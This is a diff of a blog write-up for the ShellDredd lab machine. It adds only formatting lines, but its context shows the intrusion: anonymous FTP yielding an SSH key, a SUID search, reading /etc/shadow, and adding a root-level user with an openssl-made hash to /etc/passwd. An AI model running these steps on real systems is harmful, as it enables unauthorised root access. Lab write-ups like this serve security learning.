@@ -13,6 +13,7 @@ image:
 ```bash
 IP : 192.168.222.130
 ```
+{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -23,6 +24,7 @@ OPEN PORTS >
 21     FTP (Try Anonymous)
 61000  SSH
 ```
+{: .nolineno}
 
 ---
 
@@ -66,6 +68,7 @@ local: id_rsa remote: id_rsa
 1823 bytes received in 00:02 (0.86 KiB/s)
 ftp>
 ```
+{: .nolineno}
 
 Now in this FTP session I got a private key ( `id_rsa` ) for ssh login and a username as `hannah` so lets try the ssh on port `61000` →
 
@@ -90,6 +93,7 @@ hannah@ShellDredd:~$ id
 uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
 hannah@ShellDredd:~$
 ```
+{: .nolineno}
 <br>
 <br>
 
@@ -108,6 +112,7 @@ hannah@ShellDredd:~$ cat local.txt
 25be130d1a9ddcb79ff365b266f21a20
 hannah@ShellDredd:~$
 ```
+{: .nolineno}
 
 Now lets check the SUIDs files for some permissions that leads me to root →
 
@@ -129,6 +134,7 @@ hannah@ShellDredd:/$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/passwd
 hannah@ShellDredd:/$
 ```
+{: .nolineno}
 
 Now I have used the [GTFOBin](https://gtfobins.github.io/) site for searching the exploit →
 
@@ -168,6 +174,7 @@ systemd-coredump:!!:18480::::::
 ftp:*:18480:0:99999:7:::
 hannah@ShellDredd:/$
 ```
+{: .nolineno}
 
 Now I tried to decode the root password but it takes too much time so I decided to write my own user and password into the `/etc/passwd` file so lets do it now →
 
@@ -185,6 +192,7 @@ Flags:
 $ openssl passwd -1 -salt salt password
 $1$salt$qJH7.N4xYta3aEG/dfqo/0
 ```
+{: .nolineno}
 
 Now the format of this /etc/passwd file is this →
 
@@ -192,6 +200,7 @@ Now the format of this /etc/passwd file is this →
 $ password_file_in_/etc/passwd_formats
 `shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash`
 ```
+{: .nolineno}
 
 I named the user `shiv`.
 
@@ -231,6 +240,7 @@ ftp:x:107:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 shiv:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
 hannah@ShellDredd:/$
 ```
+{: .nolineno}
 
 Now lets switch user as `shiv` and use password as `password` →
 
@@ -271,6 +281,7 @@ root@ShellDredd:~# ip a
        valid_lft forever preferred_lft forever
 root@ShellDredd:~#
 ```
+{: .nolineno}
 <br>
 
 ---
